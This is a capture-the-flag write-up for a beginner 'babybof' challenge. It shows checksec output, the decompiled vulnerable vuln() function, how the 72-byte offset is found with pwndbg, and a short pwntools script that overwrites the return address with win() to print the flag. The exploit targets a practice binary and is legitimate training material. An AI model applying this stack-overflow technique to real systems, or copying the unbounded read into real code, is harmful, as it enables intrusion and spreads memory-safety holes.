---
title: "CTF@AC 2025 – babybof: Classic buffer overflow"
date: 2025-09-11
---

> *This is your first pwn challenge.*

```bash
$ file ./challenge | tr ',' '\n'
./challenge: ELF 64-bit LSB executable
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 BuildID[sha1]=503ca72683e66d996b4330fc2369ea26d6b95868
 for GNU/Linux 3.2.0
 not stripped

$ pwn checksec ./challenge                 
[*] '/home/kali/Desktop/ctfs/others/babybof/challenge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

We have an obvious buffer overflow:

```c
void vuln(void)
{
  undefined1 local_48 [64];
  
  puts("Spune ceva:");
  fflush(stdout);
  read(0,local_48,0x100);
  return;
}
```

Finding the offset:

```shell
$ gdb -q ./challenge
...SNIP...
pwndbg> disas vuln
Dump of assembler code for function vuln:
   0x000000000040123e <+0>:     push   rbp
   0x000000000040123f <+1>:     mov    rbp,rsp
   0x0000000000401242 <+4>:     sub    rsp,0x40
   0x0000000000401246 <+8>:     lea    rax,[rip+0xdd0]        # 0x40201d
   0x000000000040124d <+15>:    mov    rdi,rax
   0x0000000000401250 <+18>:    call   0x401030 <puts@plt>
   0x0000000000401255 <+23>:    mov    rax,QWORD PTR [rip+0x2df4]
   0x000000000040125c <+30>:    mov    rdi,rax
   0x000000000040125f <+33>:    call   0x401070 <fflush@plt>
   0x0000000000401264 <+38>:    lea    rax,[rbp-0x40]
   0x0000000000401268 <+42>:    mov    edx,0x100
   0x000000000040126d <+47>:    mov    rsi,rax
   0x0000000000401270 <+50>:    mov    edi,0x0
   0x0000000000401275 <+55>:    call   0x401050 <read@plt>
   0x000000000040127a <+60>:    nop
   0x000000000040127b <+61>:    leave
   0x000000000040127c <+62>:    ret
End of assembler dump.
pwndbg> b *vuln+60
Breakpoint 1 at 0x40127a
pwndbg> r
...SNIP...
Bine ai venit la PWN!
Spune ceva:
AAAAAAAA

Breakpoint 1, 0x000000000040127a in vuln ()
...SNIP...
pwndbg> search AAAAAAAA stack
Searching for byte: b'AAAAAAAA'
[stack]         0x7fffffffdc20 0x4141414141414141 ('AAAAAAAA')
pwndbg> i f
Stack level 0, frame at 0x7fffffffdc70:
 rip = 0x40127a in vuln; saved rip = 0x4012d1
 called by frame at 0x7fffffffdc80
 Arglist at 0x7fffffffdc60, args: 
 Locals at 0x7fffffffdc60, Previous frame's sp is 0x7fffffffdc70
 Saved registers:
  rbp at 0x7fffffffdc60, rip at 0x7fffffffdc68
pwndbg> p 0x7fffffffdc68-0x7fffffffdc20
$1 = 72
```

We have a `win()` function that prints the flag:

```c
void win(void)
{
  char *bytesRead;
  char buffer [136];
  FILE *fh;
  
  fh = fopen("flag.txt","r");
  if (fh == (FILE *)0x0) {
    puts("Flag missing.");
    fflush(stdout);
    exit(1);
  }
  bytesRead = fgets(buffer,0x80,fh);
  if (bytesRead != (char *)0x0) {
    puts(buffer);
    fflush(stdout);
  }
  fclose(fh);
  exit(0);
}
```

```bash
pwndbg> p win
$3 = {<text variable, no debug info>} 0x401196 <win>
```

We can get the flag using the following script:

```python
from pwn import *
p = remote("ctf.ac.upt.ro", 9882)
p.sendline(b"A"*72 + p64(0x401196))
p.interactive()
```

![](https://github.com/user-attachments/assets/fc64751e-dcab-44b6-9ed6-e4889bd7edcc)
